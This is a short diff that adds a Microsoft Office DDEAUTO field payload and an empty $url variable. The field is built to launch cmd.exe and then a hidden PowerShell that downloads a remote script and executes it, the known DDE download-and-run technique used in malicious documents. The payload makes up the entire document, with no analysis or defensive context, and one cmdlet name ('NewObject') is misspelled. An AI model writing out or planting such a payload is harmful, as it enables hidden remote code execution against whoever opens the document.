@@ -1,0 +1,2 @@
+$url=''
+{ DDEAUTO C:\\Windows\\System32\\cmd.exe "/k powershell.exe -NoP -sta -NonI -W Hidden $e=(NewObject System.Net.WebClient).DownloadString($url);powershell -e $e "}
